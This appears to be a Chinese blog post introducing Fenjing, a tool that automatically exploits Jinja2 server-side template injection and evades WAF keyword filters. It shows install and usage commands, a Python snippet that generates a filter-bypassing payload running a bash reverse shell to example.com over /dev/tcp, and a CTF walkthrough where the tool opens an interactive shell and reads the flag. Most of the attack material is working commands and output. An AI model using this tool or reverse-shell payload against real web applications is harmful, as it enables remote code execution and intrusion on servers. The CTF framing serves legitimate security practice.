---
title: fenjing(焚靖)——jinja2 SSTI一把梭
date: 2023-05-11 18:36:24
tags:
---

> 焚靖是一个针对Jinja2 SSTI的命令行脚本，具有强大的自动绕过WAF功能

## 安装

### 使用pip（最省事）

```shell
pip install fenjing
python -m fenjing scan --url 'http://xxx/'
```

### 也可下载并运行docker镜像

```shell
docker pull marven11/fenjing
docker run --net host -it marven11/fenjing scan --url 'http://xxx/'
```

### 还可以直接下载源码

```shell
git clone https://github.com/Marven11/Fenjing
cd Fenjing
```

下载后可以选择直接使用（先确保用pip安装完依赖）

```shell
python -m pip install -r requirements.txt
```

也可以手动构建一个docker镜像

```shell
docker build -t fenjing .
docker run -it --net host fenjing scan --url 'http://xxx/'
```

## 使用

```shell
$ python -m fenjing --help
Usage: python -m fenjing [OPTIONS] COMMAND [ARGS]...

Options:
  --help  Show this message and exit.

Commands:
  crack  攻击指定的表单
  scan   扫描指定的网站
$ python -m fenjing crack --help
Usage: python -m fenjing crack [OPTIONS]

  攻击指定的表单

Options:
  -u, --url TEXT       form所在的URL
  -a, --action TEXT    form的action，默认为当前路径
  -m, --method TEXT    form的提交方式，默认为POST
  -i, --inputs TEXT    form的参数，以逗号分隔
  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
  --interval FLOAT     每次请求的间隔
  --user-agent TEXT    请求时使用的User Agent
  --help               Show this message and exit.
$ python -m fenjing scan --help
Usage: python -m fenjing scan [OPTIONS]

  扫描指定的网站

Options:
  -u, --url TEXT       需要扫描的URL
  -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
  --interval FLOAT     每次请求的间隔
  --user-agent TEXT    请求时使用的User Agent
  --help               Show this message and exit.
```

也可做为一个python模块集成进脚本中使用

```python
from fenjing import exec_cmd_payload

import logging

logging.basicConfig(level = logging.INFO)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", "{{",
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]

    for word in blacklist:
        if word in s:
            return False
    return True

payload, _ = exec_cmd_payload(waf, "bash -c \"bash -i >& /dev/tcp/example.com/3456 0>&1\"")

print(payload)
```

## 支持的绕过

- `'`和`"`的绕过
- 绝大部分关键字的绕过
- 自然数的绕过
- 下划线`_`
- `+`和`-`
- `~`
- `[`下标访问的绕过
- `{{}}`标签的绕过

## 使用示例

[[GDOUCTF 2023]\<ez_ze\>](<https://www.nssctf.cn/problem/3745>)
打开题目发现是一个使用POST提交表单的网页，检查响应头的`Sever`字段，发现是`Werkzeug/2.2.3 Python/3.8.16`，所以应该是一个flask程序，考虑SSTI。
使用一些常见的jinja2 SSTI payload，发现都会被WAF给过滤。
尝试焚靖一把梭：

```shell
$ python -m fenjing crack -u http://node1.anna.nssctf.cn:28140/get_flag -i name
    ____             _ _
   / __/__  ____    (_|_)___  ____ _
  / /_/ _ \/ __ \  / / / __ \/ __ `/
 / __/  __/ / / / / / / / / / /_/ /
/_/  \___/_/ /_/_/ /_/_/ /_/\__, /
              /___/        /____/

...

INFO:[cli] | Use Ctrl+D to exit.
$>> cat /flag

...

Hello, $ NSSCTF{82377006-eb0f-4ebd-9a9f-ba6ad3ba7c17}
 $!
$>>
```

可见焚靖的WAF绕过能力还是非常强大的

## 参考资料

[Marven11/Fenjing: 一个类似SQLMap的Jinja2 SSTI利用脚本 | A SQLMap-like Jinja2 SSTI cracker](https://github.com/Marven11/Fenjing)（官方GitHub页面）

## 想找一个通用的SSTI payload生成器？

可以去尝试一下[tplmap](https://github.com/epinna/tplmap)
